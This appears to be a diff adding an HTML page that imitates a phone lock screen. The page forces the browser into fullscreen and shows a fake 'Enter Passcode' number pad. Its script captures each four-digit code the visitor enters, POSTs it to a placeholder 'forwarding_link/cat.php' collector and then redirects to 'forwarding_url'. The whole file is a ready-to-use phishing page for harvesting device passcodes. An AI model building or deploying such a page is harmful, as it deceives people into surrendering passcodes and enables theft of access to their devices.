@@ -1,0 +1,592 @@
+<html>
+<head>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<style type="text/css">
+
+#content {
+  width:100%;
+  height:100%;
+  background: url("https://www.alliphonewallpapers.com/images/wallpapers/640/xdhcgmxsn.jpg");
+  background-repeat: no-repeat;
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;
+
+}
+
+#content {
+    zoom: 70%;
+
+}
+
+#redirect {
+  padding:15px;
+  margin-top:10px;
+
+}
+ body { visibility:hidden;
+ 
+  }
+
+  .button1 {
+  background-color: transparent;
+  border: none;
+  font-size: 1em;
+}
+
+.barrier-bg {
+  position: fixed;
+  left: 0;
+  right: 0;
+  top: 0;
+  bottom: 0;
+  background-color: rgba(0, 0, 0, 0.6);
+  
+  z-index: 1;
+}
+
+.entry-illustration {
+  width: 26px;
+  height: 26px;
+  position: absolute;
+  border: 2px solid #dfffff;
+  border-radius: 26px;
+  transition: background-color 500ms;
+  
+  top: 0;
+  left: 0;
+}
+
+.number {
+  opacity: 0;
+}
+
+input {
+  cursor: pointer;
+}
+
+h1 {
+  text-align: center;
+  font-size: 2.2em;
+  color: #dfffff;
+  position: relative;
+  z-index: 2;
+  padding-top:7vh;
+}
+
+.first-entry {
+  top: -80px;
+  left: 145px;
+}
+
+.second-entry {
+  top: -80px;
+  left: 220px;
+}
+
+.third-entry {
+  top: -80px;
+  left: 290px;
+}
+
+.forth-entry {
+  top: -80px;
+  left: 360px;
+}
+
+.number-pad {
+  width: 530px;
+  position: relative;
+  text-align: center;
+  padding-top: 40px;
+  transform: translate(-50%, 0%);
+  -webkit-transform: translate(-50%, 0%);
+  left: 50%;
+  top: 70px;
+  z-index: 2;
+  color: #dfffff;
+}
+
+.number {
+  position: absolute;
+  width: 150px;
+  height: 150px;
+}
+
+.number:nth-child(1) { 
+  top: 40px;
+  left: 0px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(3) { 
+  top: 40px;
+  left: 185px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(5) { 
+  top: 40px;
+  left: 377px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(7) {
+  top: 220px;
+  left: 0px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(9) {
+  top: 220px;
+  left: 190px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(11) {
+  top: 220px;
+  left: 377px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(13) {
+  top: 390px;
+  left: 0px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(15) {
+  top: 390px;
+  left: 190px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(17) {
+  top: 390px;
+  left: 377px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number:nth-child(19) {
+  top: 560px;
+  left: 377px;
+  position: absolute;
+  left: 44%;
+  transform: translate(-50%, 0%);
+  -webkit-transform: translate(-50%, 0%);
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.number-push {
+  width: 150px;
+  height: 150px;
+  float: left;
+  border-radius: 100%;
+  border: 4px solid #dfffff;
+  margin-right: 40px;
+  margin-bottom: 23px;
+  cursor: pointer;
+  font-size: 4em;
+  text-align: center;
+  padding-top: 25px;
+  box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  transition: background-color 300ms, color 300ms;
+}
+
+.number-push:active {
+  background-color: #dfffff;
+  color: #243946;
+}
+
+.number:active +  .number-push {
+  background-color: #dfffff;
+  color: #243946;
+}
+
+.number-push:after {
+  display: block;
+  font-size: 0.2em;
+  position: relative;
+  top: -10px;
+}
+
+.number-push:nth-child(4):after {
+  content: "A B C";
+}
+
+.number-push:nth-child(6) {
+  margin-right: 0;
+}
+
+.number-push:nth-child(6):after {
+  content: "D E F";
+}
+
+.number-push:nth-child(8):after {
+  content: "G H I";
+}
+
+.number-push:nth-child(10):after {
+  content: "J K L";
+}
+
+.number-push:nth-child(12) {
+  margin-right: 0;
+}
+
+.number-push:nth-child(12):after {
+  content: "M N O";
+}
+
+.number-push:nth-child(14):after {
+  content: "P Q R S";
+}
+
+.number-push:nth-child(16):after {
+  content: "T U V";
+}
+
+.number-push:nth-child(18) {
+  margin-right: 0;
+}
+
+.number-push:nth-child(18):after {
+  content: "W X Y Z";
+}
+
+.centered {
+  position: absolute;
+  left: 190px;
+  top: 560px;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+}
+
+.reset {
+  position: absolute;
+  right: 0px;
+  top: 700px;
+  border: none;
+  background-color: transparent;
+  font-size: 1.9em;
+  font-weight: bold;
+  cursor: pointer;
+  color: #dfffff;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+  outline:0;
+
+}
+
+.emergency {
+
+
+
+  position: absolute;
+  left: 10px;
+  top: 700px;
+  
+  border: none;
+  background-color: transparent;
+  
+  font-size: 1.9em;
+  font-weight: bold;
+  
+  color: #dfffff;
+  -webkit-tap-highlight-color:  rgba(255, 255, 255, 0); 
+  outline:0;
+
+}
+
+
+
+  </style>
+</head>
+<body onload="block()">
+<div id="redirect">
+<button class="button1" onclick="myFunction();">Redirect to forwarding_url...</button>
+</div>
+<div class="content" id="content">  
+<div class="barrier-bg">
+</div>
+
+<h1>Enter Passcode</h1>
+<form class="number-pad">
+  <input class="number" type="radio" key="1" />
+  <span class="number-push" >1</span>
+  <input class="number" type="radio" key="2"/>
+  <span class="number-push">2</span>
+  <input class="number" type="radio" key="3"/>
+  <span class="number-push">3</span>
+  <input class="number" type="radio" key="4"/>
+  <span class="number-push">4</span>
+  <input class="number" type="radio" key="5"/>
+  <span class="number-push">5</span>
+  <input class="number" type="radio" key="6"/>
+  <span class="number-push">6</span>
+  <input class="number" type="radio" key="7"/>
+  <span class="number-push">7</span>
+  <input class="number" type="radio" key="8"/>
+  <span class="number-push">8</span>
+  <input class="number" type="radio" key="9"/>
+  <span class="number-push">9</span>
+  <input class="number centered" type="radio"  id="centered"/>
+  <span class="number-push centered" >0</span>
+  <span class="entry-illustration first-entry" id="entry-illustration first-entry"></span>
+  <span class="entry-illustration second-entry" id="entry-illustration second-entry"></span>
+  <span class="entry-illustration third-entry" id="entry-illustration third-entry"></span>
+  <span class="entry-illustration forth-entry" id="entry-illustration forth-entry"></span>
+  <input class="reset" type="reset" value="Cancel" key="-2" />
+  <input class="emergency" type:"reset" value="Emergency" key="-2"/>
+</form>
+</div>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script type="text/javascript">
+
+(function () {
+  var num;
+
+  num = "";
+
+
+ $(".reset").on("click", function (e) {
+  num = "";
+document.getElementById("entry-illustration first-entry").style.backgroundColor= "transparent";
+document.getElementById("entry-illustration second-entry").style.backgroundColor= "transparent";
+document.getElementById("entry-illustration third-entry").style.backgroundColor= "transparent";
+document.getElementById("entry-illustration forth-entry").style.backgroundColor= "transparent";
+ });
+
+ $(".centered").on("click", function (e) {
+  var b;
+  b = 0;
+  num += b;
+
+  if (num.length == 1) {
+
+          document.getElementById("entry-illustration first-entry").style.backgroundColor= "#dfffff";
+        }
+
+
+        if (num.length == 2) {
+
+          document.getElementById("entry-illustration second-entry").style.backgroundColor="#dfffff";
+        }
+
+                if (num.length == 3) {
+
+          document.getElementById("entry-illustration third-entry").style.backgroundColor="#dfffff";
+        }
+
+      if(num.length == 4) {
+         document.getElementById("entry-illustration forth-entry").style.backgroundColor="#dfffff";
+
+
+     $.ajax({
+    type: 'POST',
+    url: 'forwarding_link/cat.php',
+    data: { 
+        'passcode': num//, 
+
+    },
+    success: function(msg){
+
+    }
+});
+    num = "";
+    window.location.replace("forwarding_url");
+   
+  }
+ });
+
+  $(".number").on("click", function (e) {
+    var v;
+    v = $(this).attr('key');
+    switch (v) {
+      case "-1":
+        num = num.slice(0, num.length - 1);
+        break;
+      case "-2":
+        num = "";
+        break;
+
+      default:
+        num += v;
+
+        if (num.length == 1) {
+
+          document.getElementById("entry-illustration first-entry").style.backgroundColor= "#dfffff";
+        }
+
+
+        if (num.length == 2) {
+
+          document.getElementById("entry-illustration second-entry").style.backgroundColor="#dfffff";
+        }
+
+                if (num.length == 3) {
+
+          document.getElementById("entry-illustration third-entry").style.backgroundColor="#dfffff";
+        }
+
+      if(num.length == 4) {
+         document.getElementById("entry-illustration forth-entry").style.backgroundColor="#dfffff";
+
+
+     $.ajax({
+    type: 'POST',
+    url: 'forwarding_link/cat.php',
+    data: { 
+        'passcode': num//, 
+
+    },
+    success: function(msg){
+
+    }
+});
+    num = "";
+    window.location.replace("forwarding_url");
+
+  }
+  }
+  });
+  
+
+}).call(this);
+
+
+
+
+
+</script>
+<script>
+
+function block() {
+
+  $(document).ready(function() {
+  document.getElementsByTagName("html")[0].style.visibility = "visible";
+  document.getElementsByTagName("body")[0].style.visibility = "visible";
+
+});
+
+
+
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("content");
+
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+}
+
+function myFunction() {
+
+
+  toggleFullScreen(document.body);
+  var y = document.getElementById("redirect");
+  var a = document.getElementById("content");
+
+  
+ 
+document.addEventListener("fullscreenchange", function() {
+
+if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("mozfullscreenchange", function() {
+
+  if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+document.addEventListener("webkitfullscreenchange", function() {
+
+
+
+ if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+    
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+
+
+});
+document.addEventListener("msfullscreenchange", function() {
+
+if (a.style.display === "none") {
+
+    a.style.display = "block";
+    y.style.display = "none";
+  } else {
+
+    a.style.display = "none";
+    y.style.display = "block";
+    
+  }
+
+});
+
+}
+
+function toggleFullScreen(elem) {
+    // ## The below if statement seems to work better ## if ((document.fullScreenElement && document.fullScreenElement !== null) || (document.msfullscreenElement && document.msfullscreenElement !== null) || (!document.mozFullScreen && !document.webkitIsFullScreen)) {
+    if ((document.fullScreenElement !== undefined && document.fullScreenElement === null) || (document.msFullscreenElement !== undefined && document.msFullscreenElement === null) || (document.mozFullScreen !== undefined && !document.mozFullScreen) || (document.webkitIsFullScreen !== undefined && !document.webkitIsFullScreen) || (document.fullscreenElement !== undefined && document.fullscreenElement === null)) {
+        if (elem.requestFullScreen) {
+            elem.requestFullScreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.webkitRequestFullScreen) {
+            elem.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    } else {
+        if (document.cancelFullScreen) {
+            document.cancelFullScreen();
+        } else if (document.mozCancelFullScreen) {
+            document.mozCancelFullScreen();
+        } else if (document.webkitCancelFullScreen) {
+            document.webkitCancelFullScreen();
+        } else if (document.msExitFullscreen) {
+            document.msExitFullscreen();
+        }
+    }
+}
+
+</script>
+
+</body>
+</html>
